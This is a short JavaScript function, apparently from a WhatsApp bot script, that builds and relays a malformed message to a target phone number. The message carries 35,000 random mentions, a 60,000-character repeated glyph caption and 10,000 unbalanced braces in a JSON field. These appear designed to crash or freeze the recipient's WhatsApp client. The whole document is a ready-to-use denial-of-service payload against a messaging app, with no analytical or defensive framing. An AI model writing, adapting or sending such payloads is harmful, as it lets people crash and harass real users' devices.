async function newsletterSqL(target, ptcp = true) {
    
    const img300 = require('./folder/folder/image.jpg')
    
    const mentionedList = [
    target, ...Array.from({ length: 35000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '1@newsletter',
                        newsletterName: "",
                        jpegThumbnail: img300,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + 9999999999,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: client.generateMessageTag(),
            },
        };

        await client.relayMessage(target, message, {
          userJid: target,
        });
    } catch (error) {
        console.log("error:\n" + error);
    }
}